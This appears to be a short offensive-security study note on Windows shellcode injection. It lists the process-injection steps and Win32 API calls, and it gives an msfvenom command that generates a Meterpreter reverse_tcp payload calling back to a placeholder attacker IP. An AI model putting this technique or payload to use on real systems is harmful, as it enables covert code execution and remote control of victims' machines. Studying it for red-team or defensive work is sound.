# Shellcode injection 

The general steps for a shellcode injection:

* get a handle on a process by attaching to it or creating it
* allocate the buffer in the process memory with needed permission
* write your shellcode into that buffer in process memory
* create a thread that runs what is allocated and written into the process

This example shows how to implement this technique using the Win32 API:

https://learn.microsoft.com/en-us/windows/win32/api/


Useful API calls: 

* OpenProcess
* VirtualAllocEx
* WriteProcessMemory
* CreateRemoteThreadEx


To generate shellcode we can use msfvenom:

```
msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> EXITFUNC=thread -f c var_name=<SHELLCODE_VARIABLE>

```
